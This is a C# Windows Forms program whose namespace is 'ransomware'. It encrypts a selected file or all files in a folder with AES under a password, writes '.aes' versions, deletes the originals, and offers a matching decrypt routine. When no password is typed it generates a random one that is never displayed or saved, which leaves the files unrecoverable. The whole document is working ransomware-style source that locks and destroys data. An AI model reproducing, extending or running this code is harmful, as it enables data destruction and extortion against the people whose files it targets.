using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Security.Cryptography;
using System.Runtime.InteropServices;

namespace ransomware
{
    public partial class Form1 : Form
    {

        [DllImport("KERNEL32.DLL", EntryPoint = "RtlZeroMemory")]
        public static extern bool ZeroMemory(IntPtr Destination, int Length);
        public Form1()
        {

            InitializeComponent();

        }

        private void btnOpenFiles_Click(object sender, EventArgs e)
        {

            using (OpenFileDialog ofd = new OpenFileDialog() { Filter = "AllFiles|*.*" })
            {

                if (DialogResult.OK == ofd.ShowDialog())
                {

                    txtPath.Text = ofd.FileName;

                }

            }

        }

        private void btnOpenDirectory_Click(object sender, EventArgs e)
        {

            using (FolderBrowserDialog fbd = new FolderBrowserDialog())
            {

                if (DialogResult.OK == fbd.ShowDialog())
                {

                    txtPath.Text = fbd.SelectedPath;

                }

            }

        }

        private void FileEncrypt(string inputFilesPath, string password)
        {

            byte[] pass = Encoding.UTF8.GetBytes(password);
            byte[] salt = new byte[32];

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;

            AES.Padding = PaddingMode.PKCS7;

            var key = new Rfc2898DeriveBytes(pass, salt, 50000);

            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Mode = CipherMode.CFB;

            string[] files = {""};

            FileAttributes attr = File.GetAttributes(inputFilesPath);

            if ((attr & FileAttributes.Directory) == FileAttributes.Directory)
            {

                //path is a directoryq
                files = Directory.GetFiles(inputFilesPath);

            }
            else
            {

                //path is a file
                files[0] = inputFilesPath;

            }

            foreach(string file in files)
            {

                if (file.Substring(file.Length - 4) != ".aes")
                {

                    using (FileStream fsCrypt = new FileStream(file + ".aes", FileMode.Create))
                    {

                        fsCrypt.Write(salt, 0, salt.Length);

                        using (CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateEncryptor(), CryptoStreamMode.Write))
                        {

                            using (FileStream fs = new FileStream(file, FileMode.Open))
                            {

                                byte[] buffer = new byte[1048575];
                                int read;

                                while ((read = fs.Read(buffer, 0, buffer.Length)) > 0)
                                {

                                    cs.Write(buffer, 0, read);

                                }

                            }

                        }

                    }

                    File.Delete(file);

                }

            }

        }

        private void btnEncrypt_Click(object sender, EventArgs e)
        {

            string password = txtPassword.Text;

            //generate random password when txtPassword.Text is empty
            if(txtPassword.Text == null || txtPassword.Text == "")
                password = GeneratePassword();

            GCHandle gCHandle = GCHandle.Alloc(txtPassword.Text, GCHandleType.Pinned);
            FileEncrypt(txtPath.Text, password);
            ZeroMemory(gCHandle.AddrOfPinnedObject(), txtPassword.Text.Length * 2);
            gCHandle.Free();

            MessageBox.Show("Encryption Done!");

        }


        private void FileDecrypt(string inputFilesPath, string password)
        {

            byte[] pass = Encoding.UTF8.GetBytes(password);
            byte[] salt = new byte[32];

            RijndaelManaged AES = new RijndaelManaged();
            AES.KeySize = 256;
            AES.BlockSize = 128;

            AES.Padding = PaddingMode.PKCS7;

            var key = new Rfc2898DeriveBytes(pass, salt, 50000);

            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Mode = CipherMode.CFB;

            string[] files = { "" };

            FileAttributes attr = File.GetAttributes(inputFilesPath);

            if ((attr & FileAttributes.Directory) == FileAttributes.Directory)
            {

                //path is a directory
                files = Directory.GetFiles(inputFilesPath);

            }
            else
            {

                //path is a file
                files[0] = inputFilesPath;

            }

            foreach (string file in files)
            {

                if (file.Substring(file.Length - 4) == ".aes")
                {

                    using (FileStream fsCrypt = new FileStream(file, FileMode.Open))
                    {

                        fsCrypt.Read(salt, 0, salt.Length);


                        using (CryptoStream cs = new CryptoStream(fsCrypt, AES.CreateDecryptor(), CryptoStreamMode.Read))
                        {

                            using (FileStream fso = new FileStream(file.Replace(".aes", ""), FileMode.Create))
                            {

                                byte[] buffer = new byte[1048575];
                                int read;

                                while ((read = cs.Read(buffer, 0, buffer.Length)) > 0)
                                {

                                    fso.Write(buffer, 0, read);

                                }

                            }

                        }

                    }

                    File.Delete(file);

                }

            }

        }

        private void btnDescrypt_Click(object sender, EventArgs e)
        {

            GCHandle gch = GCHandle.Alloc(txtPassword.Text, GCHandleType.Pinned);
            FileDecrypt(txtPath.Text, txtPassword.Text);

            ZeroMemory(gch.AddrOfPinnedObject(), txtPassword.Text.Length * 2);
            gch.Free();
            MessageBox.Show("Decryption Done!");

        }

        private string GeneratePassword()
        {

            List<char> chars = new List<char>();

            for(char c = 'a'; c <= 'z'; c++)
                chars.Add(c);

            for (char c = 'A'; c <= 'Z'; c++)
                chars.Add(c);

            for (char c = '0'; c <= '9'; c++)
                chars.Add(c);

            for (char c = '!'; c <= '?'; c++)
                chars.Add(c);

            int passwordLength = 10;

            StringBuilder sb = new StringBuilder();
            Random random = new Random();
                
            int i = 0;

            while(i < passwordLength)
            {

                sb.Append(chars[random.Next(0, chars.Count)]);

                i++;

            }

            //MessageBox.Show("Generated password is:" sb.ToString());

            return sb.ToString();

        }

    }
}
